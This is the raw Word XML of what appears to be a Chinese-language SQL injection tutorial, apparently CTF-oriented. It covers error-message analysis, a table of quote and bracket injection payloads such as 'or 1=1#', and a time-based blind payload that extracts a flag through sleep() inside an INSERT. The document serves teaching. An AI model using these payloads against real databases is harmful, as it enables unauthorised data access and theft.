                <wp:effectExtent l="0" t="0" r="21590" b="17780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496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Pr="00377B7F" w:rsidRDefault="00812AAA" w:rsidP="00377B7F">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="23241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textAlignment w:val="baseline"/>
                              <w:rPr>
                                <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia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You have an error in your SQL syntax;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check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the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manual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that corresponds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to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your MySQL </w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="00812AAA" w:rsidRPr="00D3129B" w:rsidRDefault="00812AAA" w:rsidP="00C81A76">
                            <w:pPr>
                              <w:widowControl/>
                              <w:shd w:val="clear" w:color="auto" w:fill="23241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textAlignment w:val="baseline"/>
                              <w:rPr>
                                <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia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server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version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for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the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right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syntax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to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use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near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E6DB74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''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AE81FF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1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E6DB74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''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92672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LIMIT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AE81FF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0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F8F8F2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AE81FF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1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00377B7F">
                              <w:rPr>
                                <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                                <w:color w:val="E6DB74"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' at line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0774DD" id="_x0000_s1030" type="#_x0000_t202" style="width:415.3pt;height:3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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="00812AAA" w:rsidRPr="00377B7F" w:rsidRDefault="00812AAA" w:rsidP="00377B7F">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="23241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textAlignment w:val="baseline"/>
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
                          <w:color w:val="F8F8F2"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pP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You have an error in your SQL syntax;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check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the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manual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that corresponds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to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your MySQL </w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRPr="00D3129B" w:rsidRDefault="00812AAA" w:rsidP="00C81A76">
                      <w:pPr>
                        <w:widowControl/>
                        <w:shd w:val="clear" w:color="auto" w:fill="23241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textAlignment w:val="baseline"/>
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体" w:hint="eastAsia"/>
                          <w:color w:val="F8F8F2"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="24"/>
                          <w:szCs w:val="24"/>
                        </w:rPr>
                      </w:pP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server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version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for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the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right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syntax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to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use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near </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00377B7F">
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                          <w:color w:val="E6DB74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''</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00377B7F">
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                          <w:color w:val="AE81FF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1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00377B7F">
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                          <w:color w:val="E6DB74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''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F92672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LIMIT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377B7F">
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                          <w:color w:val="AE81FF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0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00377B7F">
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                          <w:color w:val="F8F8F2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377B7F">
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                          <w:color w:val="AE81FF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1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00377B7F">
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:eastAsia="宋体" w:hAnsi="inherit" w:cs="宋体"/>
                          <w:color w:val="E6DB74"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  <w:t>' at line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3129B" w:rsidRDefault="00D3129B" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>数字型</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D3129B" w:rsidRDefault="00D3129B" w:rsidP="00D3129B">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:t>例如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D3129B" w:rsidRDefault="00D3129B" w:rsidP="00D3129B">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7AD6F8B8" wp14:editId="2410976B">
                <wp:extent cx="5274310" cy="496331"/>
                <wp:effectExtent l="0" t="0" r="21590" b="17780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496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 w:rsidP="00D3129B"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SELECT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*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FROM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users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WHERE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id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=$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id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微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
                                <w:color w:val="F92672"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                              </w:rPr>
                              <w:t>LIMIT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 xml:space="preserve"> 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,</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="number"/>
                                <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
                                <w:color w:val="AE81FF"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="23241F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8F8F2"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="23241F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D6F8B8" id="_x0000_s1031" type="#_x0000_t202" style="width:415.3pt;height:3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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00D3129B"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SELECT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*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FROM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users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WHERE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id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=$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id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微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
                          <w:color w:val="F92672"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                        </w:rPr>
                        <w:t>LIMIT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 xml:space="preserve"> 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0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,</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="number"/>
                          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
                          <w:color w:val="AE81FF"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:hint="eastAsia"/>
                          <w:color w:val="F8F8F2"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="23241F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E2B1E" w:rsidRDefault="007E2B1E" w:rsidP="007E2B1E">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:t>此时的报错会是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>’’ limit 0,1’</w:t>
      </w:r>
      <w:r w:rsidR="00681412">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>（注意，此时没有</w:t>
      </w:r>
      <w:r w:rsidR="00681412">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00681412">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和之前的引号了）</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E2B1E" w:rsidRDefault="007E2B1E" w:rsidP="00D3129B">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="22C9ABD9" wp14:editId="2DD269F7">
                <wp:extent cx="5274310" cy="694690"/>
                <wp:effectExtent l="0" t="0" r="21590" b="10160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694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 w:rsidP="00264C7E">
                            <w:pPr>
                              <w:pStyle w:val="HTML"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                              <w:textAlignment w:val="baseline"/>
                              <w:rPr>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
                                <w:color w:val="F8F8F2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You have an error in your SQL syntax;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check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the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manual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that corresponds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to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your MySQL </w:t>
                            </w:r>
                          </w:p>
                          <w:p w:rsidR="00812AAA" w:rsidRPr="00264C7E" w:rsidRDefault="00812AAA" w:rsidP="00264C7E">
                            <w:pPr>
                              <w:pStyle w:val="HTML"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                              <w:textAlignment w:val="baseline"/>
                              <w:rPr>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
                                <w:color w:val="F8F8F2"/>
                              </w:rPr>
                            </w:pP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server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version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for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the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right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syntax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to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use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near </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="string"/>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                                <w:color w:val="E6DB74"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                              </w:rPr>
                              <w:t>''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keyword"/>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                                <w:color w:val="F92672"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                              </w:rPr>
                              <w:t>LIMIT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rStyle w:val="number"/>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                                <w:color w:val="AE81FF"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                                <w:color w:val="F8F8F2"/>
                              </w:rPr>
                              <w:t>,</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="number"/>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                                <w:color w:val="AE81FF"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rStyle w:val="string"/>
                                <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                                <w:color w:val="E6DB74"/>
                                <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                              </w:rPr>
                              <w:t>' at line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C9ABD9" id="_x0000_s1032" type="#_x0000_t202" style="width:415.3pt;height:5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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w:rsidR="00812AAA" w:rsidRDefault="00812AAA" w:rsidP="00264C7E">
                      <w:pPr>
                        <w:pStyle w:val="HTML"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                        <w:textAlignment w:val="baseline"/>
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
                          <w:color w:val="F8F8F2"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                          <w:color w:val="F8F8F2"/>
                        </w:rPr>
                        <w:t xml:space="preserve">You have an error in your SQL syntax;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check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the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manual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that corresponds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to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your MySQL </w:t>
                      </w:r>
                    </w:p>
                    <w:p w:rsidR="00812AAA" w:rsidRPr="00264C7E" w:rsidRDefault="00812AAA" w:rsidP="00264C7E">
                      <w:pPr>
                        <w:pStyle w:val="HTML"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="23241F"/>
                        <w:textAlignment w:val="baseline"/>
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
                          <w:color w:val="F8F8F2"/>
                        </w:rPr>
                      </w:pP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server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version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for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the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right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syntax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to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use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near </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="string"/>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                          <w:color w:val="E6DB74"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                        </w:rPr>
                        <w:t>''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keyword"/>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                          <w:color w:val="F92672"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                        </w:rPr>
                        <w:t>LIMIT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 xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="number"/>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                          <w:color w:val="AE81FF"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                        </w:rPr>
                        <w:t>0</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                          <w:color w:val="F8F8F2"/>
                        </w:rPr>
                        <w:t>,</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="number"/>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                          <w:color w:val="AE81FF"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rStyle w:val="string"/>
                          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
                          <w:color w:val="E6DB74"/>
                          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
                        </w:rPr>
                        <w:t>' at line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10146" w:rsidRPr="00A64139" w:rsidRDefault="00465180" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00A64139">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>报错类型汇总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2"/>
        <w:gridCol w:w="662"/>
        <w:gridCol w:w="3542"/>
        <w:gridCol w:w="1576"/>
        <w:gridCol w:w="1550"/>
      </w:tblGrid>
      <w:tr w:rsidR="00465180" w:rsidRPr="00465180" w:rsidTr="00DA2270">
        <w:trPr>
          <w:tblHeader/>
        </w:trPr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引号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括号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SQL</w:t>
            </w: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拼接实例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报错信息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center"/>
              <w:rPr>
                <w:rFonts w:ascii="microsoft yahei" w:eastAsia="宋体" w:hAnsi="microsoft yahei" w:cs="宋体" w:hint="eastAsia"/>
                <w:b/>
                <w:bCs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b/>
                <w:bCs/>
                <w:color w:val="362E2B"/>
                <w:kern w:val="0"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>注入方式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uers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$id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ED2871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‘’ limit 0,1</w:t>
            </w:r>
            <w:r w:rsidR="00392A4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id=-1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users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($id)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id=-1)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'$id'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DD67DA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‘’1’’ limit 0,1</w:t>
            </w:r>
            <w:r w:rsidR="00392A4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id=’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('$id')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6E7B29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‘’1’’</w:t>
            </w:r>
            <w:r w:rsidR="00CD16D2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) LIMIT 0,1’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id=’)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双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"$id"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id=”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双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单重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("$id")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6E7B29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‘”1””</w:t>
            </w:r>
            <w:r w:rsidR="00E125A6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) LIMIT 0,1’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id=”) or 1=1#</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00465180" w:rsidRPr="00465180" w:rsidTr="00DA227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双重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select * from user where id = </w:t>
            </w:r>
            <w:r w:rsidRPr="00465180">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:eastAsia="宋体" w:hAnsi="Courier New" w:cs="Courier New"/>
                <w:color w:val="3F3F3F"/>
                <w:kern w:val="0"/>
                <w:sz w:val="19"/>
                <w:szCs w:val="19"/>
              </w:rPr>
              <w:t>(($id))</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"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65180" w:rsidRPr="00465180" w:rsidRDefault="00465180" w:rsidP="00465180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62E2B"/>
                <w:kern w:val="0"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00465180">
              <w:rPr>
                <w:rFonts w:ascii="microsoft yahei" w:eastAsia="宋体" w:hAnsi="microsoft yahei" w:cs="宋体"/>
                <w:color w:val="362E2B"/>
                <w:kern w:val="0"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>id=-1)) or 1=1#</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00465180" w:rsidRPr="00465180" w:rsidRDefault="00465180" w:rsidP="00465180"/>
    <w:p w:rsidR="00E173A6" w:rsidRDefault="00E173A6" w:rsidP="00D77A34">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>针对</w:t>
      </w:r>
      <w:r>
        <w:t>DML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句的注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E173A6" w:rsidRDefault="00E173A6" w:rsidP="00E173A6">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>不仅是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>delete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insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句同样可以进行注入。</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对于这类</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>DML</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句的注入，一般方法都是将</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>语句构造成“</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>or (</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>子查询语句</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00D93936">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>”的形式。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="63"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>二次查询注入</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>mysql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>中没有二次查询，所以采用子查询。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="64"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入语法</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>insert into table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (c1,c2,c3) values (v1,’test’ or</w:t>
      </w:r>
      <w:r w:rsidR="00092FB3">
        <w:t>/and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> [sql </w:t>
      </w:r>
      <w:r w:rsidR="0093213F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>selec</w:t>
      </w:r>
      <w:r w:rsidR="0093213F">
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:t>cmd], v3);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Delete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">delete </w:t>
      </w:r>
      <w:r>
        <w:t>from table where c1=v1 or</w:t>
      </w:r>
      <w:r w:rsidR="00092FB3">
        <w:t>/and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> [sql </w:t>
      </w:r>
      <w:r w:rsidR="0093213F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>selec</w:t>
      </w:r>
      <w:r w:rsidR="0093213F">
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:t>cmd];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="00BB0AB3" w:rsidP="00BB0AB3">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>Update</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">update table </w:t>
      </w:r>
      <w:r>
        <w:t>set c1=v1 or</w:t>
      </w:r>
      <w:r w:rsidR="00092FB3">
        <w:t>/and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> [sql </w:t>
      </w:r>
      <w:r w:rsidR="0093213F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>selec</w:t>
      </w:r>
      <w:r w:rsidR="0093213F">
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:t>cmd];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC37A1" w:rsidRDefault="00EC37A1" w:rsidP="00EC37A1">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>示例</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC37A1" w:rsidRDefault="00EC37A1" w:rsidP="00EC37A1">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000161A9" w:rsidRPr="00EC37A1" w:rsidRDefault="00C220F1" w:rsidP="00EC37A1">
      <w:pPr>
        <w:pStyle w:val="my"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>insert</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> into </w:t>
      </w:r>
      <w:r w:rsidRPr="00C220F1">
        <w:t>client_ip (ip) values ('asd' or (select case when (substring((select flag f</w:t>
      </w:r>
      <w:r>
        <w:t>rom flag ) from 1 for 1 )='w</w:t>
      </w:r>
      <w:r w:rsidRPr="00C220F1">
        <w:t>') then sleep(5) else sleep(0) end))#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB0AB3" w:rsidRDefault="0026686B" w:rsidP="0026686B">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>updatexml()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026686B" w:rsidRDefault="0026686B" w:rsidP="0026686B">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>extrac</w:t>
      </w:r>
      <w:r>
        <w:t>tvalue()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0026686B" w:rsidRPr="0026686B" w:rsidRDefault="0026686B" w:rsidP="0026686B">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>name_const()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="005C2440" w:rsidRDefault="00912F6A" w:rsidP="00D77A34">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="005C2440">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>访问操作系统</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>读文件</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D6806" w:rsidRDefault="00912F6A" w:rsidP="005C2440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MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="006D6806">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="1260" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
